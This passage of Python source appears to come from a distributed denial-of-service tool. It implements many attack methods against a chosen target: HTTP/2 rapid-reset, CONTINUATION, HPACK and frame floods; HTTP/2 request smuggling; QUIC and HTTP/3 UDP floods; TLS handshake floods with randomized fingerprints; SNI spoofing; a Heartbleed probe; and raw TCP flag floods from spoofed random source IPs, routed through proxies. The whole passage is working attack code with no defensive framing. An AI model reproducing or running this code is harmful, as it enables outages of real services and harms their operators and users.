            proxy_manager.report(entry, False); raise

    def _rate_allow(self, n=1):
        if self.adaptive_limiter: return self.adaptive_limiter.consume(n)
        if self.rate_limit_pps <= 0: return True
        with self._rl_lock:
            now = time.monotonic(); dt = now - self._rl_last; self._rl_last = now
            self._rl_tokens = min(self.rate_limit_pps, self._rl_tokens + dt * self.rate_limit_pps)
            if self._rl_tokens >= n: self._rl_tokens -= n; return True
            return False

    def _rip(self):
        r = _rand()
        for _ in range(20):
            ip = ipaddress.ip_address(r.next())
            if not (ip.is_private or ip.is_loopback or ip.is_multicast or
                    ip.is_reserved or ip.is_link_local or ip.is_unspecified):
                return str(ip)
        return "1.2.3.4"
    def _rport(self): return _rand().port()
    def _rua(self): return random.choice(USER_AGENTS)
    def _h2_client_config(self):
        if not HAS_H2: return None
        return h2.config.H2Configuration(client_side=True, header_encoding='utf-8')

    # ---- HTTP/2 ----
    def _h2_rapid_reset(self):
        if not HAS_H2: return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                for _ in range(500):
                    if self._stop: break
                    try:
                        sid = conn.get_next_available_stream_id()
                        conn.send_headers(sid, [(':method','GET'),(':path','/'),
                            (':scheme','https'),(':authority',self.target_host),
                            ('user-agent', self._rua())], end_stream=False)
                        conn.reset_stream(sid, error_code=0x08)
                        data = conn.data_to_send()
                        if data:
                            sock.sendall(data); self.stats_lf.add_sent(2, len(data))
                            with self.method_lock: self.method_stats["HTTP2_RAPID_RESET"] += 2
                    except Exception: break
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_continuation_flood(self):
        if not HAS_H2: return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.update_settings({h2.settings.SettingCodes.HEADER_TABLE_SIZE: 0})
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                for _ in range(100):
                    if self._stop: break
                    try:
                        sid = conn.get_next_available_stream_id()
                        headers = [(':method','GET'),(':path','/'),(':scheme','https'),
                                   (':authority',self.target_host),('cookie','x'*65536)]
                        conn.send_headers(sid, headers, end_stream=False)
                        data = conn.data_to_send()
                        if data:
                            sock.sendall(data); self.stats_lf.add_sent(1, len(data))
                            with self.method_lock: self.method_stats["HTTP2_CONTINUATION_FLOOD"] += 1
                    except Exception: break
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_ping_flood(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                batch = b""
                for _ in range(1000):
                    pp = os.urandom(8)
                    batch += struct.pack("!I", 8)[1:] + b"\x06\x00\x00\x00\x00\x00" + pp
                sock.sendall(batch); self.stats_lf.add_sent(1000, len(batch))
                with self.method_lock: self.method_stats["HTTP2_PING_FLOOD"] += 1000
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_settings_flood(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface)
                settings_data = (struct.pack("!HI", 0x01, 0) + struct.pack("!HI", 0x02, 0) +
                                 struct.pack("!HI", 0x03, 100) + struct.pack("!HI", 0x04, 0x7fffffff) +
                                 struct.pack("!HI", 0x05, 0xffffff))
                batch = b""
                for _ in range(200):
                    frame = struct.pack("!I", len(settings_data))[1:] + b"\x04\x00\x00\x00\x00\x00" + settings_data
                    batch += frame
                sock.sendall(batch); self.stats_lf.add_sent(200, len(batch))
                with self.method_lock: self.method_stats["HTTP2_SETTINGS_FLOOD"] += 200
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_window_update_flood(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                batch = b""
                for _ in range(1000):
                    wu = struct.pack("!I", 0x7fffffff)
                    batch += struct.pack("!I", 4)[1:] + b"\x08\x00\x00\x00\x00\x00" + wu
                sock.sendall(batch); self.stats_lf.add_sent(1000, len(batch))
                with self.method_lock: self.method_stats["HTTP2_WINDOW_UPDATE_FLOOD"] += 1000
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_hpack_bomb(self):
        if not HAS_H2: return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.update_settings({h2.settings.SettingCodes.HEADER_TABLE_SIZE: 65536})
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                for _ in range(100):
                    if self._stop: break
                    try:
                        sid = conn.get_next_available_stream_id()
                        hdrs = [(':method','GET'),(':path','/'),(':scheme','https'),
                                (':authority',self.target_host)]
                        for i in range(200): hdrs.append((f'x-custom-{i}','v'*400))
                        conn.send_headers(sid, hdrs, end_stream=False)
                        data = conn.data_to_send()
                        if data:
                            sock.sendall(data); self.stats_lf.add_sent(1, len(data))
                            with self.method_lock: self.method_stats["HTTP2_HPACK_BOMB"] += 1
                    except Exception: break
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_stream_multiplex(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                hp = b"\x82\x84\x86\x41\x8c\xf1\xe3\xc0\xbf"
                batch = b""
                for i in range(2000):
                    sid = (i * 2 + 1) & 0x7fffffff
                    batch += struct.pack("!I", len(hp))[1:] + b"\x01\x05" + struct.pack("!I", sid) + hp
                sock.sendall(batch); self.stats_lf.add_sent(2000, len(batch))
                with self.method_lock: self.method_stats["HTTP2_STREAM_MULTIPLEX"] += 2000
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_priority_flood(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                batch = b""
                for i in range(1000):
                    sid = (i * 2 + 1) & 0x7fffffff
                    pl = struct.pack("!IB", random.randint(0, 0x7fffffff), random.randint(0, 256))
                    batch += struct.pack("!I", len(pl))[1:] + b"\x02\x00\x00\x00\x00" + struct.pack("!I", sid) + pl
                sock.sendall(batch); self.stats_lf.add_sent(1000, len(batch))
                with self.method_lock: self.method_stats["HTTP2_PRIORITY_FLOOD"] += 1000
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_goaway_flood(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                batch = b""
                for _ in range(500):
                    pl = struct.pack("!II", random.randint(0, 0x7fffffff), random.choice([0,1,2,3,8,11]))
                    batch += struct.pack("!I", len(pl))[1:] + b"\x07\x00\x00\x00\x00\x00" + pl
                sock.sendall(batch); self.stats_lf.add_sent(500, len(batch))
                with self.method_lock: self.method_stats["HTTP2_GOAWAY_FLOOD"] += 500
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_push_promise_flood(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                hp = b"\x82\x84\x86\x41\x8c"
                batch = b""
                for i in range(500):
                    sid = (i * 2 + 1) & 0x7fffffff
                    promised = (i * 2 + 3) & 0x7fffffff
                    pl = struct.pack("!I", promised) + hp
                    batch += struct.pack("!I", len(pl))[1:] + b"\x05\x04\x00\x00\x00" + struct.pack("!I", sid) + pl
                sock.sendall(batch); self.stats_lf.add_sent(500, len(batch))
                with self.method_lock: self.method_stats["HTTP2_PUSH_PROMISE_FLOOD"] += 500
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_rst_stream_spam(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                batch = b""
                for _ in range(2000):
                    sid = _rand().next() & 0x7fffffff
                    pl = struct.pack("!I", random.choice([0,1,2,3,8,11]))
                    batch += struct.pack("!I", len(pl))[1:] + b"\x03\x00" + struct.pack("!I", sid) + pl
                sock.sendall(batch); self.stats_lf.add_sent(2000, len(batch))
                with self.method_lock: self.method_stats["HTTP2_RST_STREAM_SPAM"] += 2000
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_made_you_reset(self):
        if not HAS_H2: return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                for _ in range(100):
                    if self._stop: break
                    try:
                        sid = conn.get_next_available_stream_id()
                        conn.send_headers(sid, [(':method','POST'),(':path','/'),
                            (':scheme','https'),(':authority',self.target_host)], end_stream=False)
                        conn.send_data(sid, b'A'*2048, end_stream=False)
                        conn.reset_stream(sid, error_code=0x08)
                        data = conn.data_to_send()
                        if data:
                            sock.sendall(data); self.stats_lf.add_sent(1, len(data))
                            with self.method_lock: self.method_stats["HTTP2_MADE_YOU_RESET"] += 1
                    except Exception: break
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_spca(self):
        if not HAS_H2: return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                sid = conn.get_next_available_stream_id()
                conn.send_headers(sid, [(':method','POST'),(':path','/'),
                    (':scheme','https'),(':authority',self.target_host)], end_stream=False)
                conn.send_data(sid, b"GET /?id=1 HTTP/1.1\r\n\r\n", end_stream=False)
                data = conn.data_to_send(); sock.sendall(data)
                conn.reset_stream(sid, error_code=0x08); sock.sendall(conn.data_to_send())
                self.stats_lf.add_sent(2, len(data))
                with self.method_lock: self.method_stats["HTTP2_SPCA"] += 1
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_bomb(self):
        if not HAS_H2: return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.update_settings({h2.settings.SettingCodes.HEADER_TABLE_SIZE: 65536})
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                sid = conn.get_next_available_stream_id()
                conn.send_headers(sid, [(':method','GET'),(':path','/'),
                    (':scheme','https'),(':authority',self.target_host)], end_stream=False)
                hdr = b"\x40\x06x-bomb" + bytes([0]) + bytes([0xbe] * 32000)
                frame = struct.pack("!I", len(hdr))[1:] + b"\x01\x04" + struct.pack("!I", sid) + hdr
                sock.sendall(frame); self.stats_lf.add_sent(1, len(frame))
                with self.method_lock: self.method_stats["HTTP2_BOMB"] += 1
                time.sleep(0.5); sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_smuggling(self):
        if not HAS_H2:
            self._smuggle_clte(); return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                sid = conn.get_next_available_stream_id()
                conn.send_headers(sid, [(':method','POST'),(':path','/'),
                    (':scheme','https'),(':authority',self.target_host),
                    ('transfer-encoding','chunked'),('content-length','4')], end_stream=False)
                conn.send_data(sid, b"0\r\n\r\nGET /admin HTTP/1.1\r\nX: X", end_stream=False)
                sock.sendall(conn.data_to_send()); sock.close()
                self.stats_lf.add_sent(1, 200)
                with self.method_lock: self.method_stats["HTTP2_SMUGGLING"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_grpc_churn(self):
        if not HAS_H2: return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                for _ in range(500):
                    if self._stop: break
                    try:
                        sid = conn.get_next_available_stream_id()
                        conn.send_headers(sid, [(':method','POST'),
                            (':path','/grpc.channelz.v1.Channelz/GetServers'),
                            (':scheme','https'),(':authority',self.target_host),
                            ('content-type','application/grpc'),('te','trailers')], end_stream=False)
                        conn.send_data(sid, b"\x00\x00\x00\x00\x00", end_stream=False)
                        conn.reset_stream(sid, error_code=0x08)
                        self.stats_lf.add_sent(1, 100)
                        with self.method_lock: self.method_stats["HTTP2_GRPC_CHURN"] += 1
                    except Exception: break
                sock.sendall(conn.data_to_send()); time.sleep(0.5); sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_padding_flood(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                hp = b"\x82\x84\x86\x41\x8c\xf1\xe3\xc0\xbf"
                for i in range(200):
                    sid = (i * 2 + 1) & 0x7fffffff
                    padding = os.urandom(random.randint(200, 255))
                    frame_len = 1 + len(hp) + len(padding)
                    hdr = struct.pack("!I", frame_len)[1:] + b"\x01\x0C" + struct.pack("!I", sid)
                    sock.sendall(hdr + bytes([len(padding)]) + hp + padding)
                self.stats_lf.add_sent(200, 80000)
                with self.method_lock: self.method_stats["HTTP2_PADDING_FLOOD"] += 200
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_data_padding(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings)
                hp = b"\x82\x84\x86\x41\x8c\xf1\xe3\xc0\xbf"
                for i in range(100):
                    sid = (i * 2 + 1) & 0x7fffffff
                    hf = struct.pack("!I", len(hp))[1:] + b"\x01\x04" + struct.pack("!I", sid) + hp
                    sock.sendall(hf)
                    for _ in range(50):
                        padding = os.urandom(250)
                        data = b"X" * 20
                        frame_len = 1 + len(data) + len(padding)
                        dh = struct.pack("!I", frame_len)[1:] + b"\x00\x08" + struct.pack("!I", sid)
                        sock.sendall(dh + bytes([len(padding)]) + data + padding)
                self.stats_lf.add_sent(5000, 1300000)
                with self.method_lock: self.method_stats["HTTP2_DATA_PADDING"] += 5000
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_window_zero(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = struct.pack("!HI", 0x04, 0)
        settings_frame = struct.pack("!I", len(settings))[1:] + b"\x04\x00" + b"\x00\x00\x00\x00" + settings
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings_frame)
                hp = b"\x82\x84\x86\x41\x8c\xf1\xe3\xc0\xbf"
                for i in range(200):
                    sid = (i * 2 + 1) & 0x7fffffff
                    hf = struct.pack("!I", len(hp))[1:] + b"\x01\x04" + struct.pack("!I", sid) + hp
                    sock.sendall(hf)
                for i in range(200):
                    sid = (i * 2 + 1) & 0x7fffffff
                    wu = struct.pack("!I", 0)
                    wf = struct.pack("!I", 4)[1:] + b"\x08\x00" + struct.pack("!I", sid) + wu
                    sock.sendall(wf)
                self.stats_lf.add_sent(400, 10000)
                with self.method_lock: self.method_stats["HTTP2_WINDOW_ZERO"] += 400
                time.sleep(5); sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_stream_exhaust(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = struct.pack("!HI", 0x03, 0x7fffffff)
        settings_frame = struct.pack("!I", len(settings))[1:] + b"\x04\x00" + b"\x00\x00\x00\x00" + settings
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings_frame)
                hp = b"\x82\x84\x86\x41\x8c\xf1\xe3\xc0\xbf"
                for i in range(5000):
                    sid = (i * 2 + 1) & 0x7fffffff
                    hf = struct.pack("!I", len(hp))[1:] + b"\x01\x04" + struct.pack("!I", sid) + hp
                    try: sock.sendall(hf)
                    except Exception: break
                self.stats_lf.add_sent(5000, 75000)
                with self.method_lock: self.method_stats["HTTP2_STREAM_EXHAUST"] += 5000
                time.sleep(random.uniform(30, 60)); sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _h2_headers_split(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = struct.pack("!HI", 0x01, 0)
        settings_frame = struct.pack("!I", len(settings))[1:] + b"\x04\x00" + b"\x00\x00\x00\x00" + settings
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sock.sendall(preface + settings_frame)
                for i in range(100):
                    sid = (i * 2 + 1) & 0x7fffffff
                    hp1 = b"\x82\x84\x86"
                    hf1 = struct.pack("!I", len(hp1))[1:] + b"\x01\x00" + struct.pack("!I", sid) + hp1
                    sock.sendall(hf1)
                    for _ in range(100):
                        hp2 = os.urandom(random.randint(100, 400))
                        cf = struct.pack("!I", len(hp2))[1:] + b"\x09\x00" + struct.pack("!I", sid) + hp2
                        sock.sendall(cf)
                self.stats_lf.add_sent(100, 1000000)
                with self.method_lock: self.method_stats["HTTP2_HEADERS_SPLIT"] += 100
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    # ---- HTTP/3 ----
    def _http3_quic_flood(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    dcid = os.urandom(8); scid = os.urandom(8)
                    pkt = b"\xc3\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
                    pkt += b"\x00\x44\x9a" + os.urandom(1200)
                    s.sendto(pkt, (self.target_ip, self.target_port or 443))
                    self.stats_lf.add_sent(1, len(pkt))
                    with self.method_lock: self.method_stats["HTTP3_QUIC_FLOOD"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _http3_qpack_bomb(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    dcid = os.urandom(8); scid = os.urandom(8)
                    hdr = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
                    payload = b"\x00\x00\x00\x01\xff\x00\x00\x1d" + os.urandom(1200)
                    s.sendto(hdr + payload, (self.target_ip, self.target_port or 443))
                    self.stats_lf.add_sent(1, 1300)
                    with self.method_lock: self.method_stats["HTTP3_QPACK_EXPANSION"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _http3_retry_loop(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    dcid = os.urandom(8); scid = os.urandom(8)
                    pkt = b"\xf0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid
                    pkt += bytes([len(scid)]) + scid
                    pkt += os.urandom(16) + os.urandom(16)
                    s.sendto(pkt, (self.target_ip, self.target_port or 443))
                    self.stats_lf.add_sent(1, len(pkt))
                    with self.method_lock: self.method_stats["HTTP3_RETRY_LOOP"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _http3_0rtt_flood(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    dcid = os.urandom(8)
                    pkt = b"\x50" + dcid + os.urandom(1200)
                    s.sendto(pkt, (self.target_ip, self.target_port or 443))
                    self.stats_lf.add_sent(1, len(pkt))
                    with self.method_lock: self.method_stats["HTTP3_0RTT_FLOOD"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _http3_connection_close_flood(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    dcid = os.urandom(8); scid = os.urandom(8)
                    hdr = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
                    # CONNECTION_CLOSE frame type 0x1c, error code 0, reason phrase large
                    payload = struct.pack("!B", 0x1c) + struct.pack("!I", 0) + struct.pack("!B", 0) + \
                              struct.pack("!H", 1200) + os.urandom(1200)
                    s.sendto(hdr + payload, (self.target_ip, self.target_port or 443))
                    self.stats_lf.add_sent(1, len(hdr) + len(payload))
                    with self.method_lock: self.method_stats["HTTP3_CONNECTION_CLOSE_FLOOD"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _http3_stream_reset_flood(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    dcid = os.urandom(8); scid = os.urandom(8)
                    hdr = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
                    batch = b""
                    for i in range(50):
                        sid = i * 4 + 2
                        pl = struct.pack("!B", 0x04) + struct.pack("!I", sid) + \
                             struct.pack("!I", random.choice([0x100, 0x101, 0x102])) + \
                             struct.pack("!H", 0)
                        batch += pl
                    s.sendto(hdr + batch, (self.target_ip, self.target_port or 443))
                    self.stats_lf.add_sent(1, len(hdr) + len(batch))
                    with self.method_lock: self.method_stats["HTTP3_STREAM_RESET_FLOOD"] += 50
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _http3_qpack_encoder_stall(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    dcid = os.urandom(8); scid = os.urandom(8)
                    hdr = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
                    # Insert With Name Reference abuse + Duplicate
                    payload = b"\x00\x00\x00\x01\xc0" + b"\x00" * 60 + os.urandom(1200)
                    s.sendto(hdr + payload, (self.target_ip, self.target_port or 443))
                    self.stats_lf.add_sent(1, len(hdr) + len(payload))
                    with self.method_lock: self.method_stats["HTTP3_QPACK_ENCODER_STALL"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    # ---- TLS ----
    def _build_client_hello(self, ech=False):
        return TLSFingerprint.random_client_hello(self.target_host, ech=ech)

    def _tls_ja3_randomized(self):
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                ch, ja3, ja4 = self._build_client_hello()
                sock.sendall(ch)
                with suppress(Exception):
                    sock.settimeout(2); sock.recv(1024)
                sock.close()
                self.ja3_seen.add(ja3); self.ja4_seen.add(ja4)
                self.stats_lf.add_sent(1, len(ch))
                with self.method_lock: self.method_stats["TLS_JA3_RANDOMIZED"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _tls_ja4_randomized(self): self._tls_ja3_randomized()
    def _tls_hello_flood(self): self._tls_ja3_randomized()

    def _tls_reneg(self):
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                ch, _, _ = self._build_client_hello()
                sock.sendall(ch)
                with suppress(Exception):
                    sock.settimeout(2); sock.recv(2048)
                sock.close()
                self.stats_lf.add_sent(1, len(ch))
                with self.method_lock: self.method_stats["TLS_RENEGOTIATION"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _tls_ech_flood(self):
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                ch, ja3, ja4 = self._build_client_hello(ech=True)
                sock.sendall(ch); sock.close()
                self.ja3_seen.add(ja3); self.ja4_seen.add(ja4)
                self.stats_lf.add_sent(1, len(ch))
                with self.method_lock: self.method_stats["TLS_ECH_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _sni_flood(self):
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                ch, _, _ = self._build_client_hello()
                sock.sendall(ch); sock.close()
                self.stats_lf.add_sent(1, len(ch))
                with self.method_lock: self.method_stats["SNI_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _sni_spoof(self):
        fake_snis = ["cdn.jsdelivr.net", "cdnjs.cloudflare.com", "ajax.googleapis.com",
                     "static.cloudflareinsights.com", "google-analytics.com"]
        while not self._stop:
            try:
                self._sni_spoofer.inject(random.choice(fake_snis), self.target_ip, self.target_port or 443)
                self.stats_lf.add_sent(1, 100)
                with self.method_lock: self.method_stats["SNI_SPOOF"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _tls_heartbleed_probe(self):
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                ch, _, _ = self._build_client_hello()
                sock.sendall(ch)
                with suppress(Exception):
                    sock.settimeout(2); sock.recv(4096)
                hb = b"\x18\x03\x02\x00\x03\x01\x40\x00"
                sock.sendall(hb); sock.close()
                self.stats_lf.add_sent(1, len(ch) + len(hb))
                with self.method_lock: self.method_stats["TLS_HEARTBLEED_PROBE"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _tls_session_resumption(self):
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                ch, _, _ = self._build_client_hello()
                sock.sendall(ch)
                with suppress(Exception):
                    sock.settimeout(1); sock.recv(1024)
                sock.close()
                self.stats_lf.add_sent(1, len(ch))
                with self.method_lock: self.method_stats["TLS_SESSION_RESUMPTION_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _tls_certificate_bomb(self): self._tls_hello_flood()
    def _tls_psk_flood(self): self._tls_hello_flood()
    def _tls_keyshare_flood(self): self._tls_hello_flood()
    def _tls_0rtt_flood(self): self._tls_hello_flood()

    # ---- L4 helpers ----
    def _flag_flood(self, flags, name):
        if not self.raw_tcp:
            self._tcp_flood(); return
        while not self._stop:
            try:
                pkt = tcp_packet(self._rip(), self.target_ip, self._rport(),
                                 self.target_port, _rand().next(), 0, flags)
                self.raw_tcp.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats[name] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _ack_flood(self): self._flag_flood(0x10, "ACK_FLOOD")
    def _rst_flood(self): self._flag_flood(0x04, "RST_FLOOD")
    def _fin_flood(self): self._flag_flood(0x01, "FIN_FLOOD")
    def _xmas_flood(self): self._flag_flood(0x29, "XMAS_FLOOD")
    def _null_flood(self): self._flag_flood(0x00, "NULL_FLOOD")
    def _psh_flood(self): self._flag_flood(0x08, "PSH_FLOOD")
    def _urg_flood(self): self._flag_flood(0x20, "URG_FLOOD")
